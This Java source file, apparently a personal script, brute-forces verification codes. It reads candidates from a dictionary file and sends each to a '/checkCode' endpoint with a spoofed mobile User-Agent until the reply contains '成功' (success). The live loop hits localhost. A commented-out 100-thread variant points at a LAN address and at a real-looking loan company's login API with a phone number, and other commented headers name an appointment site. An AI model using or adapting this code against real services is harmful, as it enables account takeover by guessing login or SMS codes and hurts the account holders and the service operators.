package com.java.list_learn;

import cn.hutool.core.io.FileUtil;
import lombok.SneakyThrows;
import okhttp3.*;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

/**
 * @author zJiaLi
 * @since 2020-03-25 22:27
 */
public class CodeList {
    private static final MediaType JSON
            = MediaType.get("application/json; charset=utf-8");

    private static final ConcurrentHashMap<String, String> map = new ConcurrentHashMap<>();

    private static final OkHttpClient okHttpClient = new OkHttpClient();

    private static String toRequest(String url) {
        Request request = new Request.Builder()//.addHeader("Origin", "http://appointment.hbncp.com.cn:9084")
                // .addHeader("Referer", "http://appointment.hbncp.com.cn:9084/")
                .addHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1")
                .url(url)
                .get().build();
        try (Response response = okHttpClient.newCall(request).execute()) {
            return response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    @SneakyThrows
    public static void main(String[] args) {
        List<String> list = FileUtil.readLines("passdict6.txt", StandardCharsets.UTF_8);
        List<List<String>> l = new ArrayList<>();
        for (String s : list
        ) {
            String url = "http://127.0.0.1:8080/checkCode?code=" + s;
            String s1 = toRequest(url);
            System.out.println(s1);
            if (s1.contains("成功")) {
                System.out.println("=====================正确============================");
                map.put("成功", s);
                break;
            }
        }
     /*   for (int i = 0; i < list.size(); i += 10000) {
            l.add(list.subList(i, i + 10000));
        }

        Thread[] ts = new Thread[100];
        for (int i = 0; i < 100; i++) {
            int finalI = i;
            ts[i] = new Thread(() -> {
                for (String s : l.get(finalI)) {
                    // String url = "https://postloanh5.weidai.com.cn/api/postloan/h5/out/login?phone=17100071086&code=" + s;
                    String url = "http://192.168.137.4:8080/checkCode?code=" + s;
                    String s1 = toRequest(url);
                    System.out.println(s1);
                    if (s1.contains("成功")) {
                        System.out.println("=====================正确============================");
                        map.put("成功", s);
                        break;
                    }
                }
            });
        }
        for (int i = 0; i < 100; i++) {
            ts[i].start();
        }*/
        TimeUnit.SECONDS.sleep(60);
        System.out.println(map.get("成功"));
    }
}
